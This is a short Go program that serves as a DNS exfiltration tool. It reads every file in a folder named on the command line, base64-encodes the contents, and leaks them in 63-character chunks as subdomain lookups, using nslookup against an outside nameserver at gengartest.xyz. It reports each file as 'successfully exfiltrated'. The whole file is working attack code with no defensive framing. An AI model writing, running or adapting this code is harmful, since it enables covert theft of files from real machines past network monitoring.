package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
)

var domain string = "gengartest.xyz"
var NameServer string = "ns.gengartest.xyz"

func OpenFileToBase64(file string, folder string) string {
	bytes, err := os.ReadFile(folder + "/" + file)
	if err != nil {
		fmt.Println(err.Error())
	}
	encoded := base64.StdEncoding.EncodeToString((bytes))
	fmt.Println("Sending file ---> " + folder + "/" + file)
	return encoded

}
func Nslookup(subDomain string) {
	domena := subDomain + "." + domain
	cmd := exec.Command("nslookup", domena, NameServer)
	fmt.Println("Sending data ---> " + domena + "\n")
	cmd.Run()
}
func SendtoServer(encoded string, modulo int) {
	if len(encoded) == modulo {
		subDomain := encoded[0:modulo]
		Nslookup(subDomain)
		return
	}
	subDomain := encoded[0:63]
	Nslookup(subDomain)
	rest := encoded[63:]
	SendtoServer(rest, modulo)
}
func main() {
	//iterate through files and send them
	args := os.Args[1]
	files, err := ioutil.ReadDir(args)
	if err != nil {
		fmt.Println(err.Error())
	}

	for _, file := range files {
		if file.Size() == 0 {
			fmt.Println("File " + file.Name() + " empty!")
			continue
		}
		base64blob := OpenFileToBase64(file.Name(), args)
		modulo := len(base64blob) % 63
		SendtoServer(base64blob, modulo)
		fmt.Println("[+] File " + file.Name() + " successfully exfiltrated")

	}
}
